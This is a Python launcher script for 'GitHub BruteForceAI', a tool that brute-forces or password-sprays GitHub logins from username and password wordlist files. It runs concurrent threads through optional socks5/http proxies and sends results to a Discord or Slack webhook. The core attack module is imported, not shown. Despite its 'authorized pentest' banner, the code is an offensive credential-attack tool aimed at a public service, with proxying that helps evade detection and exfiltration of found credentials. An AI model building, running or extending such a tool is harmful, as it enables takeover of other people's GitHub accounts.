#!/usr/bin/env python3
"""
GitHub BruteForceAI - Authorized Penetration Testing Tool
Advanced GitHub login brute-force & password spraying with LLM analysis
"""

import argparse
import asyncio
import logging
import sys
from pathlib import Path
from brute_github_core import GitHubBruteForceCore

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('github_bruteforce.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

BANNER = """
╔══════════════════════════════════════════════════════╗
║          GitHub BruteForceAI v2.0 - Pentest Tool     ║
║             Authorized Security Assessment           ║
╚══════════════════════════════════════════════════════╝
"""

async def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="GitHub BruteForceAI - Authorized Pentest Tool")
    parser.add_argument('--target', '-t', required=True, help='Target GitHub username(s) file')
    parser.add_argument('--wordlist', '-w', required=True, help='Password wordlist file')
    parser.add_argument('--mode', choices=['bruteforce', 'spray'], default='bruteforce', help='Attack mode')
    parser.add_argument('--threads', '-T', type=int, default=10, help='Concurrent threads')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between requests (seconds)')
    parser.add_argument('--webhook', help='Discord/Slack webhook URL for results')
    parser.add_argument('--proxy', help='Proxy URL (socks5:// or http://)')
    
    args = parser.parse_args()
    
    core = GitHubBruteForceCore(
        targets_file=args.target,
        wordlist_file=args.wordlist,
        mode=args.mode,
        threads=args.threads,
        delay=args.delay,
        webhook=args.webhook,
        proxy=args.proxy
    )
    
    await core.run_attack()
    logger.info("Attack completed. Check github_bruteforce.log and results.db")

if __name__ == "__main__":
    asyncio.run(main())
